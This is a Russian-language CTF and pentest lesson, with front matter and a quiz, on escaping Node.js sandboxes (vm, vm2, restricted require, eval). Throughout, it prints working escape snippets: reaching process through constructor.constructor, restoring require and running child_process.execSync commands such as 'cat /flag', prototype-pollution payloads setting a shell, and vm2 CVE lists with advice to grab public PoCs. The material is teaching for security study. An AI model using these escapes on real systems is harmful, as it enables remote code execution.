---
id: misc-nodejs-sandbox
title: "Node.js sandbox escape: vm, require и конструктор"
category: misc
parent: misc-sandbox-langs
difficulty: hard
order: 1
tags: [nodejs, javascript, sandbox, vm, require, escape, ctf]
prerequisites: [misc-sandbox]
useful_for:
  - "CTF Misc/web: побег из JS-песочниц"
  - "Пентест: анализ изоляции исполнения кода"
  - "Bug bounty: RCE через небезопасный eval/vm"
estimated_minutes: 45
summary: "Как выходить из Node.js-песочниц на базе vm, урезанного require и eval: побег через конструктор функции, prototype pollution, process.binding и восстановление require."
---
## Как устроены песочницы Node.js

Node.js-песочницы (`vm`, `vm2`, самодельные) изолируют исполнение JS, чтобы «безопасно» запускать чужой код. Но JavaScript — динамический язык с доступом к конструкторам, прототипам и `global`. Почти всегда находится путь к `process` и `require`, а значит — к RCE. Типовые подходы: `vm.createContext`/`vm.runInNewContext` (отдельный контекст, но общий heap и конструкторы), `vm2` (более строгая изоляция, много CVE), урезанный `require` (whitelist модулей), `eval`/`new Function`.

Ментальная модель: в JS **всё есть объект**, у каждого объекта есть `constructor`, у конструктора — цепочка до `Function`, а `Function` даёт произвольный код. Из произвольного кода доступен `process` → `require` → `child_process` → RCE.

## Побег через конструктор

```javascript
// из любой функции получаем Function
const f = () => {};
const F = f.constructor;                       // Function
F("return process")().mainModule
  .require("child_process").execSync("id");
```

```javascript
// то же короче, через constructor.constructor
[].constructor.constructor("return process")().mainModule
  .require("child_process").execSync("cat /flag");
```

```javascript
// если process недоступен напрямую — через this/global
(function(){ return this; })().process
```

Ключевая идея: sandbox-контекст изолирует **переменные**, но не убирает `constructor` у объектов. Пока вы можете создать функцию (`()=>{}`, `Function`), вы можете исполнить произвольный код.

## Обход require-whitelist

Если `require` ограничен, восстанавливаем его через `process`:

```javascript
// получить process из constructor
const proc = (function(){}).constructor("return process")();
// затем require
const req = proc.mainModule.require.bind(proc.mainModule);
req("child_process").execSync("id");
// или через module
process.binding            // низкоуровневый доступ (в старых версиях)
```

Также работают: `global.process`, `this.process`, `arguments.callee.caller` (в нестрогом режиме), `import()` (динамический импорт) для получения модулей.

## Prototype pollution

Если песочница мержит объекты (`Object.assign`, рекурсивный merge), можно «отравить» прототип:

```javascript
// отравляем Object.prototype
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
// после merge — все объекты получают свойство
// если библиотека затем использует его в exec/пути — RCE
```

Часто pollution ведёт к RCE через библиотеки (`child_process` options, `ejs`/`pug` template engines). Ищите места, где пользовательский JSON попадает в merge без фильтра `__proto__`/`constructor`.

## vm2 и его CVE

`vm2` позиционируется как защищённая песочница, но регулярно ломается: CVE-2023-29017, CVE-2023-37466, CVE-2023-32314 и др. Типовой вектор — через `Error.prepareStackTrace`, `Proxy`, `WeakMap` или асинхронные ловушки получить доступ к host-объектам.

```javascript
// (концептуально, версия-зависимо) выход из vm2 через Error stack
const err = new Error();
err.constructor.constructor("return process")()...
```

Если версия `vm2` устарела — ищите публичный PoC под неё. Для CTF часто дают точную версию.

## Разобранный пример: побег из vm

```javascript
const vm = require('vm');
const code = `
  const proc = (function(){}).constructor("return process")();
  proc.mainModule.require("child_process").execSync("cat /flag").toString()
`;
console.log(vm.runInNewContext(code));   // FLAG{vm_is_not_a_sandbox}
```

Несмотря на `runInNewContext`, код получил `process` через `constructor` и прочитал флаг. Это базовый побег, который работает почти везде, где есть доступ к `Function`.

## Справочная таблица: техники побега

| Техника | Как | Условие |
|---------|-----|---------|
| constructor → Function | `f.constructor("...")()` | есть любая функция |
| constructor.constructor | `[].constructor.constructor` | стандарт |
| this/global → process | `(function(){return this})()` | нестрогий режим |
| восстановление require | `process.mainModule.require` | есть process |
| prototype pollution | `__proto__` в merge | библиотека мержит |
| vm2 CVE | публичный PoC | устаревшая версия |
| динамический import | `import("child_process")` | поддержка ESM |

## Типовые ошибки новичка

- **Верить, что `vm` изолирует.** Он изолирует переменные, но не конструкторы.
- **Сдаваться после блокировки `require`.** Восстановите его через `process.mainModule`.
- **Забыть про prototype pollution.** Часто ведёт к RCE через библиотеки.
- **Не проверить версию vm2.** Публичные CVE дают готовый PoC.
- **Игнорировать асинхронность.** Побег бывает через `Promise`/`async` ловушки.

## Что дальше / решение

Порядок: определить тип песочницы → проверить доступ к `Function`/`constructor` → получить `process` → восстановить `require` → выполнить команду. Для vm2 — определить версию и применить CVE. Связанные уроки: `misc-sandbox`, `misc-sandbox-langs`, `misc-python-sandbox`, `misc-ruby-sandbox`. Решение — когда команда выполнена/флаг прочитан.

## Практический чек-лист

1. Определить песочницу (`vm`, `vm2`, самодельная, `eval`).
2. Проверить доступ к `Function`/`constructor` (`({}).constructor.constructor`).
3. Получить `process` через `constructor("return process")()` или `this`.
4. Восстановить `require` через `process.mainModule.require`.
5. Проверить `import()`/`process.binding` как обход.
6. Проверить prototype pollution в местах merge пользовательского JSON.
7. Для vm2 — определить версию и применить известный CVE.
8. Зафиксировать PoC: команда, вывод, флаг.

## Материалы и связанные техники

Ключевые источники: отчёты об CVE vm2 (2023) и разборы побегов через `Error.prepareStackTrace`, `Proxy`, `WeakMap`. Для prototype pollution — `__proto__`/`constructor.prototype` в JSON, попадающем в merge. Практика: в CTF часто дают `vm.runInNewContext` с «безопасным» набором и ждут побега через конструктор. Держите готовые сниппеты:

```javascript
({}).constructor.constructor("return process")().mainModule
  .require("child_process").execSync("id").toString();
```

Связанные уроки: `misc-sandbox`, `misc-sandbox-langs`, `misc-python-sandbox`, `misc-ruby-sandbox`, `misc-lua-sandbox`.

## Дополнительный пример: prototype pollution → RCE

Когда песочница позволяет мержить объекты из пользовательского JSON, можно «отравить» прототип и повлиять на последующие вызовы библиотек.

```javascript
// сервер: Object.assign({}, defaults, userInput)
const userInput = JSON.parse('{"__proto__":{"shell":"/bin/sh","env":{"EVIL":"1"}}}');
Object.assign({}, {}, userInput);       // Object.prototype отравлен
// позже какая-нибудь библиотека (child_process/шаблонизатор) читает свойства
// из прототипа и выполняет код или подставляет путь
```

Известные цепочки: pollution → `child_process.execSync` (через опции), pollution → `ejs`/`pug` (RCE в шаблонизаторе), pollution → `require` (подмена пути модуля). Проверяйте каждое место, где пользовательский JSON попадает в рекурсивный merge без фильтрации `__proto__`, `constructor`, `prototype`.

## Разбор vm2: почему «безопасная» песочница ломается

`vm2` пытается изолировать доступ к host-объектам через `Proxy` и проверки контекста, но история CVE показывает, что обход находится почти в каждой версии:

| CVE | Идея обхода |
|-----|-------------|
| CVE-2023-29017 | асинхронная ошибка в `vm2` (`handleException`) |
| CVE-2023-32314 | обход через `Promise`/`async` |
| CVE-2023-37466 | `Proxy`-ловушка при определении свойств |
| CVE-2023-37903 | `Error.prepareStackTrace` |

Общий приём — заставить `vm2` разыменовать host-объект (ошибку, промис, прокси), из которого затем достаётся `constructor` → `Function` → `process`. Практика: определите точную версию `vm2` (`npm ls vm2` или в `package.json`) и возьмите публичный PoC под неё. Если версия старая — побег почти гарантирован. Если `vm2` нет, а используется `vm` — работает базовый побег через конструктор.

## Сравнение JS-песочниц

| Песочница | Изоляция | Типичный побег |
|-----------|----------|----------------|
| `vm.runInNewContext` | контекст, общий heap | `constructor` → `Function` |
| `vm.runInThisContext` | нет | всё доступно сразу |
| `vm2` | прокси-обёртки | CVE по версии |
| урезанный `require` | whitelist модулей | `process.mainModule.require` |
| `eval` в шаблоне | нет | прямая инъекция |
| `isolated-vm` | V8-изолят | сложнее, но известны обходы |

Практический вывод: если видите `vm`/`eval`/самодельную песочницу — начинайте с побега через конструктор. Если `vm2` — смотрите версию и CVE. `isolated-vm` — самый стойкий; там ищите ошибки в передаче данных между изолятом и хостом. В любом случае ключ — найти путь от скриптового объекта к `Function` и далее к `process`.

## Квиз

```quiz
- question: "Почему vm в Node.js не считается песочницей безопасности?"
  options:
    - "Из контекста легко добраться до process/require через конструкторы"
    - "Он всегда шифрует код"
    - "Он удаляет функции"
    - "Он безвреден"
  answer: 0
  explanation: "vm не изолирует от глобальных конструкторов."
- question: "Что даёт f.constructor?"
  options:
    - "Ссылку на Function, позволяющую исполнять код"
    - "Ничего"
    - "Только имя функции"
    - "Размер функции"
  answer: 0
  explanation: "constructor функции — Function."
- question: "Как восстановить require при побеге?"
  options:
    - "process.mainModule.require или new Module().require"
    - "через JSON.parse"
    - "через Math.random"
    - "через Date"
  answer: 0
  explanation: "mainModule/Module дают доступ к require."
- question: "Чем опасен prototype pollution?"
  options:
    - "Отравляет Object.prototype и влияет на всё приложение"
    - "Ускоряет код"
    - "Шифрует строки"
    - "Удаляет массивы"
  answer: 0
  explanation: "Pollution всплывает в merge/gadget-цепочках."
- question: "Что нужно проверить у vm2?"
  options:
    - "Версию и известные CVE"
    - "Цвет консоли"
    - "Часовой пояс"
    - "Размер файла"
  answer: 0
  explanation: "Обходы vm2 зависят от версии."
```

## Где пригодится

- **CTF Misc/web:** побег из JS-песочниц.
- **Пентест:** анализ изоляции исполнения кода.
- **Bug bounty:** RCE через небезопасный eval/vm.
- **Работа:** не использовать vm для безопасности, изолировать процессы.
- **Дальше по дереву:** `misc-sandbox`, `misc-lua-sandbox`, `misc-ruby-sandbox`.
